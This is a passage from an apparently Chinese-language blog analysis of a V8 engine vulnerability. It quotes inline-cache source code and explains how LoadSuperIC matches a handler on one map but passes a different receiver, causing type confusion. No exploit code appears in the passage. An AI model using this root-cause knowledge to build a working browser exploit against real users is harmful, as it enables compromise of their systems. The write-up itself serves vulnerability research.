NO_FEEDBACK) &amp;&amp; FLAG_use_ic &amp;&amp; update_feedback; <span class="comment">// 在state不是no feedback，并且使用ic且update_feedback为真时置use_ic为true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (receiver.<span class="built_in">is_null</span>()) &#123;</span><br><span class="line">    receiver = object;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the object is undefined or null it&#x27;s illegal to try to get any</span></span><br><span class="line">  <span class="comment">// of its properties; throw a TypeError in that case.</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">IsAnyHas</span>() ? !object-&gt;<span class="built_in">IsJSReceiver</span>()</span><br><span class="line">                 : object-&gt;<span class="built_in">IsNullOrUndefined</span>(<span class="built_in">isolate</span>())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (use_ic) &#123;</span><br><span class="line">      <span class="comment">// Ensure the IC state progresses.</span></span><br><span class="line">      <span class="built_in">TRACE_HANDLER_STATS</span>(<span class="built_in">isolate</span>(), LoadIC_NonReceiver);</span><br><span class="line">      <span class="built_in">update_lookup_start_object_map</span>(object); <span class="comment">// 更新lookup_start_object的map</span></span><br><span class="line">      <span class="built_in">SetCache</span>(name, LoadHandler::<span class="built_in">LoadSlow</span>(<span class="built_in">isolate</span>())); <span class="comment">// 添加缓存</span></span><br><span class="line">      <span class="built_in">TraceIC</span>(<span class="string">&quot;LoadIC&quot;</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*name == <span class="built_in">ReadOnlyRoots</span>(<span class="built_in">isolate</span>()).<span class="built_in">iterator_symbol</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">isolate</span>()-&gt;<span class="built_in">Throw</span>&lt;Object&gt;(</span><br><span class="line">          ErrorUtils::<span class="built_in">NewIteratorError</span>(<span class="built_in">isolate</span>(), object));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsAnyHas</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">TypeError</span>(MessageTemplate::kInvalidInOperatorUse, object, name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">DCHECK</span>(object-&gt;<span class="built_in">IsNullOrUndefined</span>(<span class="built_in">isolate</span>()));</span><br><span class="line">      ErrorUtils::<span class="built_in">ThrowLoadFromNullOrUndefined</span>(<span class="built_in">isolate</span>(), object, name);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">MigrateDeprecated</span>(<span class="built_in">isolate</span>(), object)) use_ic = <span class="literal">false</span>; <span class="comment">// 如果object的map过期，则置use_ic为否</span></span><br><span class="line"></span><br><span class="line">  JSObject::<span class="built_in">MakePrototypesFast</span>(object, kStartAtReceiver, <span class="built_in">isolate</span>());</span><br><span class="line">  <span class="built_in">update_lookup_start_object_map</span>(object); <span class="comment">// 更新lookup_start_object的map</span></span><br><span class="line"></span><br><span class="line">  <span class="function">LookupIterator::Key <span class="title">key</span><span class="params">(isolate(), name)</span></span>;</span><br><span class="line">  LookupIterator it = <span class="built_in">LookupIterator</span>(<span class="built_in">isolate</span>(), receiver, key, object); <span class="comment">// 迭代器</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Named lookup in the object.</span></span><br><span class="line">  <span class="built_in">LookupForRead</span>(&amp;it, <span class="built_in">IsAnyHas</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name-&gt;<span class="built_in">IsPrivate</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">IsAnyHas</span>() &amp;&amp; name-&gt;<span class="built_in">IsPrivateName</span>() &amp;&amp; !it.<span class="built_in">IsFound</span>()) &#123;</span><br><span class="line">      <span class="function">Handle&lt;String&gt; <span class="title">name_string</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">          String::cast(Symbol::cast(*name).description()), isolate())</span></span>;</span><br><span class="line">      <span class="keyword">if</span> (name-&gt;<span class="built_in">IsPrivateBrand</span>()) &#123;</span><br><span class="line">        Handle&lt;String&gt; class_name =</span><br><span class="line">            (name_string-&gt;<span class="built_in">length</span>() == <span class="number">0</span>)</span><br><span class="line">                ? <span class="built_in">isolate</span>()-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">anonymous_string</span>()</span><br><span class="line">                : name_string;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">TypeError</span>(MessageTemplate::kInvalidPrivateBrand, object,</span><br><span class="line">                         class_name);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">TypeError</span>(MessageTemplate::kInvalidPrivateMemberRead, object,</span><br><span class="line">                       name_string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IC handling of private symbols/fields lookup on JSProxy is not</span></span><br><span class="line">    <span class="comment">// supported.</span></span><br><span class="line">    <span class="keyword">if</span> (object-&gt;<span class="built_in">IsJSProxy</span>()) &#123;</span><br><span class="line">      use_ic = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (it.<span class="built_in">IsFound</span>() || !<span class="built_in">ShouldThrowReferenceError</span>()) &#123;</span><br><span class="line">    <span class="comment">// Update inline cache and stub cache.</span></span><br><span class="line">    <span class="comment">// 更新IC</span></span><br><span class="line">    <span class="keyword">if</span> (use_ic) &#123;</span><br><span class="line">      <span class="built_in">UpdateCaches</span>(&amp;it);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">state</span>() == NO_FEEDBACK) &#123;</span><br><span class="line">      <span class="comment">// Tracing IC stats</span></span><br><span class="line">      <span class="built_in">IsLoadGlobalIC</span>() ? <span class="built_in">TraceIC</span>(<span class="string">&quot;LoadGlobalIC&quot;</span>, name)</span><br><span class="line">                       : <span class="built_in">TraceIC</span>(<span class="string">&quot;LoadIC&quot;</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsAnyHas</span>()) &#123;</span><br><span class="line">      <span class="comment">// Named lookup in the object.</span></span><br><span class="line">      Maybe&lt;<span class="type">bool</span>&gt; maybe = JSReceiver::<span class="built_in">HasProperty</span>(&amp;it);</span><br><span class="line">      <span class="keyword">if</span> (maybe.<span class="built_in">IsNothing</span>()) <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">      <span class="keyword">return</span> maybe.<span class="built_in">FromJust</span>() ? <span class="built_in">ReadOnlyRoots</span>(<span class="built_in">isolate</span>()).<span class="built_in">true_value_handle</span>()</span><br><span class="line">                              : <span class="built_in">ReadOnlyRoots</span>(<span class="built_in">isolate</span>()).<span class="built_in">false_value_handle</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the property.</span></span><br><span class="line">    Handle&lt;Object&gt; result;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_ON_EXCEPTION</span>(</span><br><span class="line">        <span class="built_in">isolate</span>(), result, Object::<span class="built_in">GetProperty</span>(&amp;it, <span class="built_in">IsLoadGlobalIC</span>()), Object);</span><br><span class="line">    <span class="keyword">if</span> (it.<span class="built_in">IsFound</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">ShouldThrowReferenceError</span>()) &#123;</span><br><span class="line">      <span class="built_in">LOG</span>(<span class="built_in">isolate</span>(), <span class="built_in">SuspectReadEvent</span>(*name, *object));</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ReferenceError</span>(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>IC::SetCache</code> 主要就是设置缓存</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IC::SetCache</span><span class="params">(Handle&lt;Name&gt; name, Handle&lt;Object&gt; handler)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">SetCache</span>(name, <span class="built_in">MaybeObjectHandle</span>(handler));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IC::SetCache</span><span class="params">(Handle&lt;Name&gt; name, <span class="type">const</span> MaybeObjectHandle&amp; handler)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK</span>(<span class="built_in">IsHandler</span>(*handler));</span><br><span class="line">  <span class="comment">// Currently only load and store ICs support non-code handlers.</span></span><br><span class="line">  <span class="built_in">DCHECK</span>(<span class="built_in">IsAnyLoad</span>() || <span class="built_in">IsAnyStore</span>() || <span class="built_in">IsAnyHas</span>());</span><br><span class="line">  <span class="keyword">switch</span> (<span class="built_in">state</span>()) &#123;</span><br><span class="line">    <span class="keyword">case</span> NO_FEEDBACK:</span><br><span class="line">      <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">    <span class="keyword">case</span> UNINITIALIZED:</span><br><span class="line">      <span class="built_in">UpdateMonomorphicIC</span>(handler, name);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> RECOMPUTE_HANDLER:</span><br><span class="line">    <span class="keyword">case</span> MONOMORPHIC:</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">IsGlobalIC</span>()) &#123;</span><br><span class="line">        <span class="built_in">UpdateMonomorphicIC</span>(handler, name);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      V8_FALLTHROUGH;</span><br><span class="line">    <span class="keyword">case</span> POLYMORPHIC:</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">UpdatePolymorphicIC</span>(name, handler)) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">is_keyed</span>() || <span class="built_in">state</span>() == RECOMPUTE_HANDLER) &#123;</span><br><span class="line">        <span class="built_in">CopyICToMegamorphicCache</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">ConfigureVectorState</span>(MEGAMORPHIC, name);</span><br><span class="line">      V8_FALLTHROUGH;</span><br><span class="line">    <span class="keyword">case</span> MEGAMORPHIC:</span><br><span class="line">      <span class="built_in">UpdateMegamorphicCache</span>(<span class="built_in">lookup_start_object_map</span>(), name, handler);</span><br><span class="line">      <span class="comment">// Indicate that we&#x27;ve handled this case.</span></span><br><span class="line">      vector_set_ = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> GENERIC:</span><br><span class="line">      <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而 <code>LoadIC::UpdateCaches</code> 主要是建立 <code>handle</code> 并更新 <code>cache</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">LoadIC::UpdateCaches</span><span class="params">(LookupIterator* lookup)</span> </span>&#123;</span><br><span class="line">  Handle&lt;Object&gt; code;</span><br><span class="line">  <span class="keyword">if</span> (lookup-&gt;<span class="built_in">state</span>() == LookupIterator::ACCESS_CHECK) &#123; <span class="comment">// 当状态为ACCESS_CHECK的时候</span></span><br><span class="line">    code = LoadHandler::<span class="built_in">LoadSlow</span>(<span class="built_in">isolate</span>()); <span class="comment">// code为slow的isolate</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!lookup-&gt;<span class="built_in">IsFound</span>()) &#123; <span class="comment">// 当能found的时候</span></span><br><span class="line">    <span class="built_in">TRACE_HANDLER_STATS</span>(<span class="built_in">isolate</span>(), LoadIC_LoadNonexistentDH);</span><br><span class="line">    Handle&lt;Smi&gt; smi_handler = LoadHandler::<span class="built_in">LoadNonExistent</span>(<span class="built_in">isolate</span>());</span><br><span class="line">    code = LoadHandler::<span class="built_in">LoadFullChain</span>(</span><br><span class="line">        <span class="built_in">isolate</span>(), <span class="built_in">lookup_start_object_map</span>(),</span><br><span class="line">        <span class="built_in">MaybeObjectHandle</span>(<span class="built_in">isolate</span>()-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">null_value</span>()), smi_handler); <span class="comment">// 从lookup_start_object_map获取code</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">IsLoadGlobalIC</span>() &amp;&amp; lookup-&gt;<span class="built_in">state</span>() == LookupIterator::JSPROXY) &#123; <span class="comment">// 当为LoadGlobalIC且状态为JSPROXY的时候</span></span><br><span class="line">    <span class="comment">// If there is proxy just install the slow stub since we need to call the</span></span><br><span class="line">    <span class="comment">// HasProperty trap for global loads. The ProxyGetProperty builtin doesn&#x27;t</span></span><br><span class="line">    <span class="comment">// handle this case.</span></span><br><span class="line">    Handle&lt;Smi&gt; slow_handler = LoadHandler::<span class="built_in">LoadSlow</span>(<span class="built_in">isolate</span>());</span><br><span class="line">    Handle&lt;JSProxy&gt; holder = lookup-&gt;<span class="built_in">GetHolder</span>&lt;JSProxy&gt;();</span><br><span class="line">    code = LoadHandler::<span class="built_in">LoadFromPrototype</span>(<span class="built_in">isolate</span>(), <span class="built_in">lookup_start_object_map</span>(),</span><br><span class="line">                                          holder, slow_handler); </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsLoadGlobalIC</span>()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (lookup-&gt;<span class="built_in">TryLookupCachedProperty</span>()) &#123; <span class="comment">// 寻找cached属性</span></span><br><span class="line">        <span class="built_in">DCHECK_EQ</span>(LookupIterator::DATA, lookup-&gt;<span class="built_in">state</span>());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (lookup-&gt;<span class="built_in">state</span>() == LookupIterator::DATA &amp;&amp;</span><br><span class="line">          lookup-&gt;<span class="built_in">GetReceiver</span>().<span class="built_in">is_identical_to</span>(lookup-&gt;<span class="built_in">GetHolder</span>&lt;Object&gt;())) &#123;</span><br><span class="line">        <span class="built_in">DCHECK</span>(lookup-&gt;<span class="built_in">GetReceiver</span>()-&gt;<span class="built_in">IsJSGlobalObject</span>());</span><br><span class="line">        <span class="comment">// Now update the cell in the feedback vector.</span></span><br><span class="line">        <span class="built_in">nexus</span>()-&gt;<span class="built_in">ConfigurePropertyCellMode</span>(lookup-&gt;<span class="built_in">GetPropertyCell</span>());</span><br><span class="line">        <span class="built_in">TraceIC</span>(<span class="string">&quot;LoadGlobalIC&quot;</span>, lookup-&gt;<span class="built_in">name</span>());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    code = <span class="built_in">ComputeHandler</span>(lookup); <span class="comment">// 使用ComputeHandler生成code</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Can&#x27;t use &#123;lookup-&gt;name()&#125; because the LookupIterator might be in</span></span><br><span class="line">  <span class="comment">// &quot;elements&quot; mode for keys that are strings representing integers above</span></span><br><span class="line">  <span class="comment">// JSArray::kMaxIndex.</span></span><br><span class="line">  <span class="built_in">SetCache</span>(lookup-&gt;<span class="built_in">GetName</span>(), code); <span class="comment">// 设置新的cache</span></span><br><span class="line">  <span class="built_in">TraceIC</span>(<span class="string">&quot;LoadIC&quot;</span>, lookup-&gt;<span class="built_in">GetName</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="RootCause"><a href="#RootCause" class="headerlink" title="RootCause"></a>RootCause</h1><p>以下是漏洞挖掘者给的漏洞解释：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::LoadSuperIC</span><span class="params">(<span class="type">const</span> LoadICParameters* p)</span> </span>&#123;</span><br><span class="line">  <span class="function">ExitPoint <span class="title">direct_exit</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TVARIABLE</span>(MaybeObject, var_handler);</span><br><span class="line">  <span class="function">Label <span class="title">if_handler</span><span class="params">(<span class="keyword">this</span>, &amp;var_handler)</span>, <span class="title">no_feedback</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">non_inlined</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>, <span class="title">try_polymorphic</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">miss</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IsUndefined</span>(p-&gt;<span class="built_in">vector</span>()), &amp;no_feedback); &lt;------- [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The lookup start object cannot be a SMI, since it&#x27;s the home object&#x27;s</span></span><br><span class="line">  <span class="comment">// prototype, and it&#x27;s not possible to set SMIs as prototypes.</span></span><br><span class="line">  TNode&lt;Map&gt; lookup_start_object_map =</span><br><span class="line">      <span class="built_in">LoadReceiverMap</span>(p-&gt;<span class="built_in">lookup_start_object</span>());</span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IsDeprecatedMap</span>(lookup_start_object_map), &amp;miss);</span><br><span class="line"></span><br><span class="line">  TNode&lt;MaybeObject&gt; feedback = &lt;------- [<span class="number">1</span>]</span><br><span class="line">      <span class="built_in">TryMonomorphicCase</span>(p-&gt;<span class="built_in">slot</span>(), <span class="built_in">CAST</span>(p-&gt;<span class="built_in">vector</span>()), lookup_start_object_map,</span><br><span class="line">                         &amp;if_handler, &amp;var_handler, &amp;try_polymorphic);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;if_handler); &lt;------- [<span class="number">2</span>]</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">LazyLoadICParameters <span class="title">lazy_p</span><span class="params">(p)</span></span>;</span><br><span class="line">    <span class="built_in">HandleLoadICHandlerCase</span>(&amp;lazy_p, <span class="built_in">CAST</span>(var_handler.<span class="built_in">value</span>()), &amp;miss,</span><br><span class="line">                            &amp;direct_exit);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;no_feedback); &lt;------- [<span class="number">3</span>]</span><br><span class="line">  &#123; <span class="built_in">LoadSuperIC_NoFeedback</span>(p); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;try_polymorphic); &lt;------- [<span class="number">4</span>]</span><br><span class="line">  TNode&lt;HeapObject&gt; strong_feedback = <span class="built_in">GetHeapObjectIfStrong</span>(feedback, &amp;miss);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;LoadSuperIC_try_polymorphic&quot;</span>);</span><br><span class="line">    <span class="built_in">GotoIfNot</span>(<span class="built_in">IsWeakFixedArrayMap</span>(<span class="built_in">LoadMap</span>(strong_feedback)), &amp;non_inlined);</span><br><span class="line">    <span class="built_in">HandlePolymorphicCase</span>(lookup_start_object_map, <span class="built_in">CAST</span>(strong_feedback),</span><br><span class="line">                          &amp;if_handler, &amp;var_handler, &amp;miss);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;non_inlined); &lt;------- [<span class="number">5</span>]</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// LoadIC_Noninlined can be used here, since it handles the</span></span><br><span class="line">    <span class="comment">// lookup_start_object != receiver case gracefully.</span></span><br><span class="line">    <span class="built_in">LoadIC_Noninlined</span>(p, lookup_start_object_map, strong_feedback, &amp;var_handler,</span><br><span class="line">                      &amp;if_handler, &amp;miss, &amp;direct_exit);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;miss); &lt;------- [<span class="number">6</span>]</span><br><span class="line">  direct_exit.<span class="built_in">ReturnCallRuntime</span>(Runtime::kLoadWithReceiverIC_Miss, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                                p-&gt;<span class="built_in">receiver</span>(), p-&gt;<span class="built_in">lookup_start_object</span>(),</span><br><span class="line">                                p-&gt;<span class="built_in">name</span>(), p-&gt;<span class="built_in">slot</span>(), p-&gt;<span class="built_in">vector</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>LoadSuperIC</code> 会被调用很多次，一开始的时候由于没有 <code>feedback</code> ，所以逻辑是 [0] → [3]。当经过了几次调用后，<code>feedback</code> 此时已经产生，那么逻辑是 [1] → [4] → [5] ，同时在 [5] 的地方注释里提到 <code>LoadIC_Noninlined</code> 也可以很好的处理 <code>lookup_start_object ≠ receiver</code> 的情况。但是事实却并非如此。</p>
<p>当我们匹配到了 <code>handle</code> 的时候会走到 <code>[2]</code> ，其会调用 <code>HandleLoadICHandlerCase</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::HandleLoadICHandlerCase</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> LazyLoadICParameters* p, TNode&lt;Object&gt; handler, Label* miss,</span></span></span><br><span class="line"><span class="params"><span class="function">    ExitPoint* exit_point, ICMode ic_mode, OnNonExistent on_nonexistent,</span></span></span><br><span class="line"><span class="params"><span class="function">    ElementSupport support_elements, LoadAccessMode access_mode)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Comment</span>(<span class="string">&quot;have_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TVARIABLE</span>(Object, var_holder, p-&gt;<span class="built_in">lookup_start_object</span>());</span><br><span class="line">  <span class="built_in">TVARIABLE</span>(Object, var_smi_handler, handler);</span><br><span class="line"></span><br><span class="line">  <span class="function">Label <span class="title">if_smi_handler</span><span class="params">(<span class="keyword">this</span>, &#123;&amp;var_holder, &amp;var_smi_handler&#125;)</span></span>;</span><br><span class="line">  <span class="function">Label <span class="title">try_proto_handler</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">call_handler</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Branch</span>(<span class="built_in">TaggedIsSmi</span>(handler), &amp;if_smi_handler, &amp;try_proto_handler);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;try_proto_handler);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">IsCodeMap</span>(<span class="built_in">LoadMap</span>(<span class="built_in">CAST</span>(handler))), &amp;call_handler);</span><br><span class="line">    <span class="built_in">HandleLoadICProtoHandler</span>(p, <span class="built_in">CAST</span>(handler), &amp;var_holder, &amp;var_smi_handler,</span><br><span class="line">                             &amp;if_smi_handler, miss, exit_point, ic_mode,</span><br><span class="line">                             access_mode);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// |handler| is a Smi, encoding what to do. See SmiHandler methods</span></span><br><span class="line">  <span class="comment">// for the encoding format.</span></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;if_smi_handler);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">HandleLoadICSmiHandlerCase</span>(</span><br><span class="line">        p, var_holder.<span class="built_in">value</span>(), <span class="built_in">CAST</span>(var_smi_handler.<span class="built_in">value</span>()), handler, miss,</span><br><span class="line">        exit_point, ic_mode, on_nonexistent, support_elements, access_mode);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;call_handler); &lt;------- [<span class="number">6</span>]</span><br><span class="line">  &#123;</span><br><span class="line">    exit_point-&gt;<span class="built_in">ReturnCallStub</span>(LoadWithVectorDescriptor&#123;&#125;, <span class="built_in">CAST</span>(handler),</span><br><span class="line">                               p-&gt;<span class="built_in">context</span>(), p-&gt;<span class="built_in">receiver</span>(), p-&gt;<span class="built_in">name</span>(),</span><br><span class="line">                               p-&gt;<span class="built_in">slot</span>(), p-&gt;<span class="built_in">vector</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以从之前的前置知识中知道 <code>handle</code> 是通过 <code>lookup_start_object_map</code> 匹配上的，但是最终在 [6] 的地方会使用 <code>handle</code> ，其却传入了一个 <code>receiver</code> ，当 <code>lookup_start_object ≠ receiver</code> 的时候便会造成类型混淆</p>
<p>我们看看错误信息</p>
